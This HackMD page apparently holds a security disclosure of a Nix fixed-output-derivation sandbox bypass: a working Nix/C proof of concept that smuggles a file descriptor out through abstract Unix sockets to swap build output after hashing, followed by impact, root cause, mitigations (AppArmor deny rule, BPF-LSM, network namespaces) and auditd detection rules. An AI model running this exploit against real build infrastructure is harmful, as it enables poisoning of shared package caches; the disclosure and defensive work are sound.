

[![](https://hackmd.io/Logo.svg)
 HackMD](https://hackmd.io/)

* + [Create new note](https://hackmd.io/new)
  + Create a note from template

* Share
  + - Share
    - Publish
  + - Sharing URL

      Link copied
    - /edit
      Copy

      Save
    - View mode

      * Edit mode
      * View mode
      * Book mode
      * Slide mode

       Edit mode
       View mode
       Book mode
       Slide mode

      Preview
    - Customize slides
    - Note Permission
    - Read

      Only me

      * Only me
      * Signed-in users
      * Everyone

      Only me
      Signed-in users
      Everyone
    - Write

      Only me

      * Only me
      * Signed-in users
      * Everyone

      Only me
      Signed-in users
      Everyone

    - More features

      Commenting,
      Suggest edit
    - Invitee
    - Invite
    - No invitee

    Copy share link
  + ![Publish Note]()
    ### Publish Note

    Everyone on the web can find and read all notes of this public team.
    Once published, notes can be searched and viewed by anyone online.
    See published notes

    I agree to HackMD’s [Community Guideline](https://hackmd.io/%40hackmd/community-guidelines).

    Please check the box to agree to the Community Guidelines.

    Unpublish

    Publish the note

    Copy link
  + More features
  + Commenting

    Permission
    Disabled
    Forbidden
    Owners
    Signed-in users
    Everyone
  + Enable
  + Permission

    Owners
    - Forbidden
    - Owners
    - Signed-in users
    - Everyone
  + Suggest edit
    [Beta](https://hackmd.io/%40docs/suggest-edit-en)

    Permission
    Disabled
    Forbidden
    Owners
    Signed-in users
    Everyone
  + Enable
  + Permission

    Owners
    - Forbidden
    - Owners
    - Signed-in users
  + Customize slides options
* + Options
  + Versions and GitHub Sync
  + Transfer ownership
  + Delete this note
  + Note settings
  + Template
  + Save as template
  + Insert from template
  + Export
  + Dropbox
  + ![](https://hackmd.io/images/logo_google_drive.png)
    Export to Google Drive
  + Gist
* Import
* Dropbox
* ![](https://hackmd.io/images/logo_google_drive.png)
  Import from Google Drive
* Gist
* Clipboard
* Download
* Markdown
* HTML
* Raw HTML

* Offline
* Sign in

Sign in
Menu
Note settings
Sharing URL
Create
Help

Create
[Create new note](https://hackmd.io/new)
Create a note from template

Menu
Options
Versions and GitHub Sync
Transfer ownership
Delete this note
Export
Dropbox
![](https://hackmd.io/images/logo_google_drive.png)
Export to Google Drive
Gist
Import
Dropbox
![](https://hackmd.io/images/logo_google_drive.png)
Import from Google Drive
Gist
Clipboard
Download
Markdown
HTML
Raw HTML

Back

* Share
* Publish

Sharing URL

Link copied

/edit
Copy

Save

 View mode

* Edit mode
* View mode
* Book mode
* Slide mode

 Edit mode
 View mode
 Book mode
 Slide mode

Preview

Customize slides

Note Permission

Read

Only me

* Only me
* Signed-in users
* Everyone

Only me
Signed-in users
Everyone

Write

Only me

* Only me
* Signed-in users
* Everyone

Only me
Signed-in users
Everyone

More features

Commenting,
Suggest edit

Invitee

Invite

No invitee

Copy share link

![Publish Note]()
### Publish Note

Everyone on the web can find and read all notes of this public team.
Once published, notes can be searched and viewed by anyone online.
See published notes

I agree to HackMD’s [Community Guideline](https://hackmd.io/%40hackmd/community-guidelines).

Please check the box to agree to the Community Guidelines.

Unpublish

Publish the note

Copy link

More features

Commenting

Permission
Disabled
Forbidden
Owners
Signed-in users
Everyone

Enable

Permission

Owners

* Forbidden
* Owners
* Signed-in users
* Everyone

Suggest edit
[Beta](https://hackmd.io/%40docs/suggest-edit-en)

Permission
Disabled
Forbidden
Owners
Signed-in users
Everyone

Enable

Permission

Owners

* Forbidden
* Owners
* Signed-in users

 owned this note

 owned this note

Published

Linked with GitHub

1

Subscribed

* Any changes

  Be notified of any changes
* Mention me

  Be notified of mention me
* Unsubscribe

Subscribe

# FOD sandbox bypass
## Original report
```nix
# Nix is a sandboxed build system. But Not everything can be handled inside its
# sandbox: Network access is normally blocked off, but to download sources, a
# trapdoor has to exist. Nix handles this by having "Fixed-output derivations".
# The detail here is not important, but in our case it means that the hash of
# the output has to be known beforehand. And if you know that, you get a few
# rights: you no longer run inside a special network namespace!
#
# Now, Linux has a special feature, that not many other unices do: Abstract
# unix domain sockets! Not only that, but those are namespaced using the
# network namespace! That means that we have a way to create sockets that are
# available in every single fixed-output derivation, and also all processes
# running on the host machine! Now, this wouldn't be that much of an issue, as,
# well, the whole idea is that the output is pure, and all processes in the
# sandbox are killed before finalizing the output. What if we didn't need those
# processes at all? Unix domain sockets have a semi-known trick: you can pass
# file descriptors around! Now, my first thought was "what if you open($out,
# O\_PATH) and pass that out of the sandbox?", but then edef came up with
# something way easier: just pass an open file descriptor for the output to the
# outside world!
#
# Let's set up some code, and I'll see you on the other side!
{ pkgs ? import <nixpkgs> { } }: let
# Let's write a small C file, inline to this Nix code.
sender = pkgs.writeCBin "sender" ''
#include <sys/socket.h>
#include <sys/un.h>
#include <stdlib.h>
#include <stddef.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
int main(int argc, char \*\*argv) {
int sock = socket(AF\_UNIX, SOCK\_STREAM, 0);
// Set up a abstract domain socket path to connect to.
struct sockaddr\_un data;
data.sun\_family = AF\_UNIX;
data.sun\_path[0] = 0;
strcpy(data.sun\_path + 1, "dihutenosa");
// Now try to connect, To ensure we work no matter what order we are
// executed in, just busyloop here.
int res = -1;
while (res < 0) {
res = connect(sock, (const struct sockaddr \*)&data,
offsetof(struct sockaddr\_un, sun\_path)
+ strlen("dihutenosa")
+ 1);
if (res < 0 && errno != ECONNREFUSED) perror("connect");
if (errno != ECONNREFUSED) break;
}
// Write our message header.
struct msghdr msg = {0};
msg.msg\_control = malloc(128);
msg.msg\_controllen = 128;
// Write an SCM\_RIGHTS message containing the output path.
struct cmsghdr \*hdr = CMSG\_FIRSTHDR(&msg);
hdr->cmsg\_len = CMSG\_LEN(sizeof(int));
hdr->cmsg\_level = SOL\_SOCKET;
hdr->cmsg\_type = SCM\_RIGHTS;
int fd = open(getenv("out"), O\_RDWR | O\_CREAT, 0640);
memcpy(CMSG\_DATA(hdr), (void \*)&fd, sizeof(int));
msg.msg\_controllen = CMSG\_SPACE(sizeof(int));
// Write a single null byte too.
msg.msg\_iov = malloc(sizeof(struct iovec));
msg.msg\_iov[0].iov\_base = "";
msg.msg\_iov[0].iov\_len = 1;
msg.msg\_iovlen = 1;
// Send it to the othher side of this connection.
res = sendmsg(sock, &msg, 0);
if (res < 0) perror("sendmsg");
int buf;
// Wait for the server to close the socket, implying that it has
// received the commmand.
recv(sock, (void \*)&buf, sizeof(int), 0);
}
'';
# Okay, so we have a file descriptor shipped out of the FOD now. But the
# Nix store is read-only, right? .. Well, yeah. But this file descriptor
# lives in a mount namespace where it is not! So even when this file exists
# in the actual Nix store, we're capable of just modifying its contents...
# But that's not all! We're able to abuse another misfeature of Nix to do
# this all without even corrupting the store! That's right, a fixed-output
# derivation whose hash doesn't match the actual contents!
smuggler = pkgs.writeCBin "smuggler" ''
#include <sys/socket.h>
#include <sys/un.h>
#include <stdlib.h>
#include <stddef.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/inotify.h>
int main(int argc, char \*\*argv) {
int sock = socket(AF\_UNIX, SOCK\_STREAM, 0);
// Bind to the socket.
struct sockaddr\_un data;
data.sun\_family = AF\_UNIX;
data.sun\_path[0] = 0;
strcpy(data.sun\_path + 1, "dihutenosa");
int res = bind(sock, (const struct sockaddr \*)&data,
offsetof(struct sockaddr\_un, sun\_path)
+ strlen("dihutenosa")
+ 1);
if (res < 0) perror("bind");
res = listen(sock, 1);
if (res < 0) perror("listen");
while (1) {
int a = accept(sock, 0, 0);
if (a < 0) perror("accept");
struct msghdr msg = {0};
msg.msg\_control = malloc(128);
msg.msg\_controllen = 128;
// Receive the file descriptor as sent by the smuggler.
recvmsg(a, &msg, 0);
struct cmsghdr \*hdr = CMSG\_FIRSTHDR(&msg);
while (hdr) {
if (hdr->cmsg\_level == SOL\_SOCKET
&& hdr->cmsg\_type == SCM\_RIGHTS) {
int res;
// Grab the copy of the file descriptor.
memcpy((void \*)&res, CMSG\_DATA(hdr), sizeof(int));
printf("preparing our hand...\n");
ftruncate(res, 0);
// Write the expected contents to the file, tricking Nix
// into accepting it as matching the fixed-output hash.
write(res, "hello, world\n", strlen("hello, world\n"));
// But wait, the file is bigger than this! What could
// this code hide?
// First, we do a bit of a hack to get a path for the
// file descriptor we received. This is necessary because
// that file doesn't exist in our mount namespace!
char buf[128];
sprintf(buf, "/proc/self/fd/%d", res);
// Hook up an inotify on that file, so whenever Nix
// closes the file, we get notified.
int inot = inotify\_init();
inotify\_add\_watch(inot, buf, IN\_CLOSE\_NOWRITE);
// Notify the smuggler that we've set everything up for
// the magic trick we're about to do.
close(a);
// So, before we continue with this code, a trip into Nix
// reveals a small flaw in fixed-output derivations. When
// storing their output, Nix has to hash them twice. Once
// to verify they match the "flat" hash of the derivation
// and once more after packing the file into the NAR that
// gets sent to a binary cache for others to consume. And
// there's a very slight window inbetween, where we could
// just swap the contents of our file. But the first hash
// is still noted down, and Nix will refuse to import our
// NAR file. To trick it, we need to write a reference to
// a store path that the source code for the smuggler drv
// references, to ensure it gets picked up. Continuing...
// Wait for the next inotify event to drop:
read(inot, buf, 128);
// first read + CA check has just been done, Nix is about
// to chown the file to root. afterwards, refscanning
// happens...
// Empty the file, seek to start.
ftruncate(res, 0);
lseek(res, 0, SEEK\_SET);
// We swap out the contents! Put in a reference for the other drv,
// to make sure the CA flag gets wiped(!)
write(res, "goodbye, world, ${mock}\n", strlen("goodbye, world, ${mock}\n"));
close(res);
printf("swaptrick finished, now to wait..\n");
return 0;
}
hdr = CMSG\_NXTHDR(&msg, hdr);
}
close(a);
}
}
'';
# That store path mentioned above? That's this one :)
mock = builtins.toFile "mock" "mock";
# To make debugging easier, we append the current time in seconds to the
# drv's names, to ensure we have to rebuild them every single time.
t = builtins.toString builtins.currentTime;
# And now to run the server:
smugglerCaller = pkgs.runCommandNoCC "caller-${t}" {
outputHashMode = "flat";
outputHashAlgo = "sha256";
outputHash = builtins.hashString "sha256" "";
} ''
${smuggler}/bin/smuggler
# Make sure we don't error out on exit.
touch $out
'';
# Run the client side, or socket sender.
smugglerSender = pkgs.runCommandNoCC "magic-${t}" {
# look ma, no tricks!
outputHashMode = "flat";
outputHashAlgo = "sha256";
outputHash = builtins.hashString "sha256" "hello, world\n";
} ''
# ${mock} is now a dependency of this drv.
exec ${sender}/bin/sender
'';
glue = pkgs.runCommandNoCC "glue" { } ''
if grep "goodbye" ${smugglerSender}; then
echo "swaptrick success, yay"
echo "try running nix-store --verify-path ${smugglerSender} :)"
else
echo "swaptrick failed :("
fi
echo ${smugglerSender} > $out
# ${smugglerCaller} to make sure we have both as a dep, so building one drv builds both
'';
in glue
```
## Impact
Severe. This bug would permit, in theory, if two malicious FODs are scheduled around the same time on the same Hydra builder, to poison the next version of the bash sources, for instance.
Do note that since some version of Nix after 2.3, this is no longer as severe an issue: You can no longer race the daemon to convince it to remove the CA flag from a CA output (and thus have it be considered non-corrupted if `nix-store --verify` is run)
## Root cause
Abstract Unix sockets are namespaced using network namespace, allowing processes to send each other fds if they are simply in the same net namespace, without any filesystem in common.
## Mitigation
There are three possible mitigations. We consider that FODs communicating with each other is uninteresting, because they can just use TCP; the offensive part is sending file handles amongst themselves.
### Block abstract unix sockets
This is the most surgical solution, and probably reduces the number of breakages this would cause, especially if we only apply the blocking to FODs, which already shouldn't be doing much other than just fetching from the network.
Advantages:
- Surgically blocks just the thing we care about.
- Doesn't change how derivations are executed
Disadvantages:
- This bug is a brilliant excuse to sandbox FODs harder by putting them in a net namespace and making the default configuration not accept less sandboxing.
- Easier to miss some way to exploit the bug, although I cannot think of one, since this is literally the job of a LSM.
- Requires root (I would at least imagine?!)
The approaches to do this all involve a Linux Security Module (LSM); seccomp cannot do this by design, since the argument of the socket address is a pointer. However, there is a LSM hook that does get the data, directly on bind(2) entry: https://github.com/torvalds/linux/blob/5db8752c3b81bd33a549f6f812bab81e3bb61b20/net/socket.c#L1833-L1854.
There are two viable LSMs that can be used to restrict this functionality:
#### AppArmor
AppArmor is definitely the older of the available LSMs.
This could be achieved with the following rule:
```
deny unix addr=@\*\*,
```
Sounds trivial?
Well.
Consider how the container implementations do it:
- https://github.com/containerd/containerd/blob/main/internal/cri/server/container\_create\_linux.go#L190
- https://github.com/opencontainers/runc/blob/02120488a4c0fc487d1ed2867e901eeed7ce8ecf/libcontainer/apparmor/apparmor\_linux.go#L58
In short, they write a file to `/etc/apparmor.d` of the outer system, run `apparmor\_parser -Kr` to load the new profile. Then after fork prior to `exec`, put the new profile name in `/proc/self/attr/apparmor/exec` (through `aa\_change\_onexec` or otherwise), and `execve`.
The significant problem here is that Nix would have to own part of `/etc/apparmor.d`, which is some rather ugly mutable state in `/etc` shared with the rest of the system. We could either add it as a static file in a package or write it at runtime, both of which are not easy for Nix to do.
To add a profile there, we would have to silently reload apparmor profiles behind the sysadmin's back; in principle this is not too unsafe but it feels gross. Also, we would depend on the apparmor userspace tools, which is somewhat unfortunate.
#### BPF-LSM
Systemd uses this for various sandboxing, and it seems viable. It can be attached to one single cgroup, and it doesn't have any ugly userspace state.
I haven't checked precisely, but I think it's likely it works back to kernel 6.0, which is relatively quite far back; certainly it's available on the latest LTS kernel.
Here's an example blog post: https://kinvolk.io/blog/2021/04/extending-systemd-security-features-with-ebpf/
Here is basically the actual code that would be required, but not cgroupified due to "that seems like a pain to write the string manipulation necessary into a PoC in C": https://gist.github.com/lf-/bf569280dfc7f863fe274bc3def65e3d
To make it work with cgroups, you would have to do the following:
- Replace "lsm/" with "lsm\_cgroup"
- Replace the attachment procedure to manually attach the programs
- attach with `struct bpf\_link \*
bpf\_program\_\_attach\_cgroup(const struct bpf\_program \*prog, int cgroup\_fd)`: ` skel->links.socket\_bind = bpf\_program\_\_attach\_cgroup(skel->progs.socket\_bind, cg\_fd);`
Advantages:
- Very clean userspace implementation, doesn't touch the system except in ephemeral ways
- Can expand this infrastructure to improve sandboxing as a whole in a very flexible way
Disadvantages:
- Less than 5 years old. May not have support on ancient distros.
- Would have to stabilize cgroups integration in Nix and turn it on by default to use cgroup LSM
#### Tomoyo
Can also do this, but isn't built into at least the archlinux kernel so isn't really viable.
### Put the FOD builder in a netns
This can be done with `slirp4netns`, which sticks the container in NAT (with IPv6 support). Note that there are a couple of caveats; for example, `/etc/resolv.conf` needs to be set up in the container.
Example code in my project Clipper: https://github.com/lf-/clipper/blob/main/crates/wire\_blahaj/src/unprivileged.rs#L279
Advantages:
- Pretty easy to implement
- More or less cannot leave any holes while doing it
- Does not require root for suitable sandboxing
Disadvantages:
- Substantive change to the FOD sandbox execution environment; FODs see different IP addresses, DNS works slightly differently
- Might break particularly weird use cases, but imo those should probably not be doing this anyway.
- Blocks incoming connections to FODs, but who needs that, [fetchtorrent](https://github.com/NixOS/nixpkgs/pull/212930)?
### Neutralize the effect of FD smuggling
Another way to mitigate this is to make it so that the exploit doesn't achieve anything. We could do this by copying the output paths after the builder is done, but before hashing.
Thus, any retained handles have no effect, since we are hashing something that the now-former builder has no access to.
This should probably be done anyway regardless of other mitigations.
Advantages:
- Changes nothing at all about how derivations are built
- We probably should be doing this anyway to better isolate the builder
Disadvantages:
- Performance cost of copying every output, though this may be varying levels of trivial depending on the filesystem. For huge tarballs of tiny files like nixpkgs this might be quite bad.
# Finding current usage
It might be a good idea to figure out how much people are actually using abstract namespace Unix sockets to see if we would be breaking anyone if we banned them in FOD.
We could use auditd on Hydra and audit all unix socket bind/connect, then analyze the audit logs:
```
-a always,exit -F arch=b64 -S bind -F saddr\_fam=1 -k unix\_bind
-a always,exit -F arch=b64 -S connect -F saddr\_fam=1 -k unix\_bind
```
which can then be analyzed like so; 010000 at the start of the address in the log is an anonymous Unix socket
```
In [2]: unhx('0100002F686178')
Out[2]: b'\x01\x00\x00/hax'
In [3]: unhx('01002F72756E2F757365722F313030302F416C616372697474792D7761796C616E642D302D3135363132362E736F636B00')
...:
Out[3]: b'\x01\x00/run/user/1000/Alacritty-wayland-0-156126.sock\x00'
```

×
#### Import from clipboard

Cancel
Clear
Import

×
#### Advanced permission required

##### Your current role can only read. Ask the system administrator to acquire write and comment permission.

Request permission
Cancel

×
#### This team is disabled

##### Sorry, this team is disabled. You can't edit this note.

OK

×
#### This note is locked

##### Sorry, only owner can edit this note.

OK

×
#### Reach the limit

##### Sorry, you've reached the max length this note can be.

**Please reduce the content or divide it to more notes, thank you!**

OK

×
#### Import from Gist

Cancel
Clear
Import

×
#### Import from Snippet

Project:
Select From Available Projects

Snippet:
Select From Available Snippets

or

Cancel
Clear
Import

×
#### Export to Snippet

Title:

File Name:

Project:
Select From Available Projects

Visibility:
Select Visibility Level
Private
Internal

Cancel
Export

×
#### Are you sure?

##### Do you really want to delete this note?

**All users will lose their connection.**

Cancel
Yes, do it!

#### Create a note from template

#### Create a note from template

![](https://hackmd.io/not-available.svg)
Oops...
This template is not available.

Use this template

Sign in

[Upgrade](/?nav=billing)

All

* All
* Team

![](/images/no-template-light.png)
![](/images/no-template-dark.png)
No template found.

Use this template

#### Create custom template

[Upgrade](/?nav=billing)

Template name

Save as option

Save this note as a template

Save to another note as a template

Cancel
Save

#### Delete template

Do you really want to delete this template?

Keep the content

Turn this template into a regular note and keep its content, versions, and comments.

Cancel
Delete

×
#### This page need refresh

##### You have an incompatible client version.

**Refresh to update.**

##### New version available!

[See releases notes here](https://hackmd.io/s/release-notes)

**Refresh to enjoy new features.**

##### Your user state has changed.

**Refresh to load new user state.**

Refresh

×
### Sign in

Email

Password

[Forgot password](https://hackmd.io/settings/forgotPassword)

or

By clicking below, you agree to our [terms of service](https://hackmd.io/s/terms).

[Sign in via Facebook](https://hackmd.io/auth/facebook)
[Sign in via Twitter](https://hackmd.io/auth/twitter)
[Sign in via GitHub](https://hackmd.io/auth/github)
[Sign in via Dropbox](https://hackmd.io/auth/dropbox)
![](https://hackmd.io/images/wallet.svg)
Sign in with Wallet

Wallet
(

)
Connect another wallet

New to HackMD? [Sign up](https://hackmd.io/join)

×
#### Help

Switch language

* English
* 中文
* Français
* Deutsch
* 日本語
* Español
* Català
* Ελληνικά
* Português
* italiano
* Türkçe
* Русский
* Nederlands
* hrvatski jezik
* język polski
* Українська
* हिन्दी
* svenska
* Esperanto
* dansk

#### Documents

[Tutorials](https://hackmd.io/c/tutorials "Tutorials")

[Book Mode Tutorial](https://hackmd.io/c/tutorials//s/how-to-create-book "Book Mode Tutorial")

[Slide Mode Tutorial](https://hackmd.io/c/tutorials//s/how-to-create-slide-deck "Slide Mode Tutorial")

[YAML Metadata](./yaml-metadata "YAML Metadata")

#### Contacts

[Facebook](https://facebook.com/hackmdio)

[Twitter](https://twitter.com/hackmdio)

[Discord](https://discord.gg/yDw3AJbmwx)

Feedback

Send us email

#### Resources

[Releases](/s/release-notes "Tutorials")

[Pricing](/pricing "YAML Metadata")

[Blog](https://blog.hackmd.io "Blog")

#### Policy

[Terms](/s/terms "Tutorials")

[Privacy](/s/privacy "YAML Metadata")

#### Cheatsheet

| Syntax | Example | Reference |
| --- | --- | --- |
| # Header | Header | [基本排版](https://hackmd.io/c/tutorials-tw//s/basic-markdown-formatting-tw) |  |
| - Unordered List | * Unordered List |  |
| 1. Ordered List | 1. Ordered List |  |
| - [ ] Todo List | * Todo List |  |
| > Blockquote | Blockquote |  |
| \*\*Bold font\*\* | **Bold font** |  |
| \*Italics font\* | *Italics font* |  |
| ~~Strikethrough~~ | ~~Strikethrough~~ |  |
| 19^th^ | 19th |  |
| H~2~O | H2O |  |
| ++Inserted text++ | Inserted text |  |
| ==Marked text== | Marked text |  |
| [link text](https:// "title") | Link |  |
| ![image alt](https:// "title") | Image |  |
| `Code` | `Code` | [在筆記中貼入程式碼](https://hackmd.io/c/tutorials-tw//s/how-to-use-code-blocks-tw) |  |
| ```javascriptvar i = 0;``` | ``` var i = 0; ``` |  |
| :smile: | :smile: | [Emoji list](https://github.com/ikatyang/emoji-cheat-sheet) |
| {%youtube youtube\_id %} | Externals |  |
| $L^aT\_eX$ | LaTeX |  |
| :::infoThis is a alert area.::: | This is a alert area. |  |

×

#### Versions and GitHub Sync

Sign in to link this note to GitHub
Sign in to HackMD
[Learn more](https://hackmd.io/c/tutorials//%40docs/sync-a-note-with-github)

This note is not linked with GitHub
Pull from GitHub
Push to GitHub
[Learn more](https://hackmd.io/c/tutorials//%40docs/sync-a-note-with-github)

Add badge
Pull
Push
GitHub Link Settings

[Upgrade now](/?nav=billing)

####

####

Version named by

More

Less

* Edit
* Delete

Save as version

####

Name

Description

**Note content is identical to the latest version.**
Cancel
Name this version

Compare with

Previous version

Choose a version

Only named versions

![No search result](https://hackmd.io/empty-search-result.svg)

Version not found

Revert
Download

×
####

![]()
#####

OK

×
#### Feedback

Submission failed, please try again
### Thanks for your support.

On a scale of 0-10, how likely is it that you would recommend HackMD to your friends, family or business associates?

Please give us some advice and help us improve HackMD.

I’m willing to participate in user experience research or beta testing so HackMD could build things I want.

My Email:

Cancel
Submit

![](/images/feedback.svg)

×
####

Cancel
OK

×
#### Remove version name

##### Do you want to remove this version name and description?

Cancel
OK

×
#### Transfer ownership

Transfer to

Team you've joined

No teams available

Warning:  is a **public team**. If you transfer note to this team, **everyone on the web can find and read this note.**

Current team member

No team members available

Cancel

Transfer

#### Link with GitHub

Please authorize HackMD on GitHub

* Please sign in to GitHub and install the HackMD app on your GitHub repo.
* HackMD links with GitHub through a GitHub App. You can choose which repo to install our App.

[Learn more](https://hackmd.io/c/tutorials//%40docs/sync-a-note-with-github)
Cancel
[Sign in to GitHub](https://github.com/login/oauth/authorize?client_id=Iv1.dce7f04830297ce5&redirect_uri=https%3A%2F%2Fhackmd.io%2Fapi%2Fgithub%2Fsync%2Fcallback)

#### Push the note to GitHub Push to GitHub Pull a file from GitHub

[Authorize again](https://github.com/login/oauth/authorize?client_id=Iv1.dce7f04830297ce5&redirect_uri=https%3A%2F%2Fhackmd.io%2Fapi%2Fgithub%2Fsync%2Fcallback)

#### Choose which file to push to

Select repo

Refresh
[Authorize more repos](https://github.com/apps/hackmd-hub/installations/new)

Select branch

Select file

Select branch

Choose version(s) to push

* [Save a new version and push](#create-new-version)
* [Choose from existing versions](#select-from-existing-version)

Name

Description

Cancel
Push

Cancel
Push

Include title and tags

Available push count

[Upgrade](/?nav=billing)

Cancel
Pull

×
#### Pull from GitHub

###

Pull from branch

Cancel
Apply all changes

File from GitHub

File from HackMD

×
#### GitHub Link Settings

#### File linked

Linked by
![]()

File path

Last synced branch

Available push count

[Upgrade](/?nav=billing)

#### Danger Zone

Unlink
Unlink
You will no longer receive notification when GitHub file changes after unlink.

Syncing

×
#### Push failed

![](https://hackmd.io/push-xx.svg)

Cancel
Try again

![](https://hackmd.io/push-done.svg)
Push successfully

